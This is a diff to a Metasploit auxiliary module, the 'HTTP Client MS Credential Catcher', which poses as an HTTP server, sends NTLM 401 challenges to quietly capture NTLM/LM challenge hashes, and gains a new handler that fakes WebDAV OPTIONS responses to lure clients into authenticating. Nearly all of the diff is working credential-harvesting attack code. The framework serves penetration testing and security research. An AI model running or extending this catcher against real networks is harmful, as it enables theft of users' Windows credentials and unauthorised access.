@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -27,7 +23,6 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'        => 'HTTP Client MS Credential Catcher',
-			'Version'     => '$Revision$',
 			'Description' => %q{
 					This module attempts to quietly catch NTLM/LM Challenge hashes.
 				},
@@ -35,7 +30,6 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					'Ryan Linn <sussurro[at]happypacket.net>',
 				],
-			'Version'     => '$Revision$',
 			'License'     => MSF_LICENSE,
 			'Actions'     =>
 				[
@@ -66,24 +60,29 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def on_request_uri(cli, request)
-		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")
+		print_status("Request '#{request.uri}'...")
 
-		# If the host has not started auth, send 401 authenticate with only the NTLM option
-		if(!request.headers['Authorization'])
-			response = create_response(401, "Unauthorized")
-			response.headers['WWW-Authenticate'] = "NTLM"
-			cli.send_response(response)
+		case request.method
+		when 'OPTIONS'
+			process_options(cli, request)
 		else
-			method,hash = request.headers['Authorization'].split(/\s+/,2)
-			# If the method isn't NTLM something odd is goign on. Regardless, this won't get what we want, 404 them
-			if(method != "NTLM")
-				print_status("Unrecognized Authorization header, responding with 404")
-				send_not_found(cli)
-				return false
-			end
+			# If the host has not started auth, send 401 authenticate with only the NTLM option
+			if(!request.headers['Authorization'])
+				response = create_response(401, "Unauthorized")
+				response.headers['WWW-Authenticate'] = "NTLM"
+				cli.send_response(response)
+			else
+				method,hash = request.headers['Authorization'].split(/\s+/,2)
+				# If the method isn't NTLM something odd is goign on. Regardless, this won't get what we want, 404 them
+				if(method != "NTLM")
+					print_status("Unrecognized Authorization header, responding with 404")
+					send_not_found(cli)
+					return false
+				end
 
-			response = handle_auth(cli,hash)
-			cli.send_response(response)
+				response = handle_auth(cli,hash)
+				cli.send_response(response)
+			end
 		end
 	end
 
@@ -95,6 +94,23 @@ class Metasploit3 < Msf::Auxiliary
 			return
 		end
 		exploit()
+	end
+
+	def process_options(cli, request)
+		print_status("OPTIONS #{request.uri}")
+		headers = {
+			'MS-Author-Via' => 'DAV',
+			'DASL'          => '<DAV:sql>',
+			'DAV'           => '1, 2',
+			'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
+			'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',
+			'Cache-Control' => 'private'
+		}
+		resp = create_response(207, "Multi-Status")
+		headers.each_pair {|k,v| resp[k] = v }
+		resp.body = ""
+		resp['Content-Type'] = 'text/xml'
+		cli.send_response(resp)
 	end
 
 	def handle_auth(cli,hash)
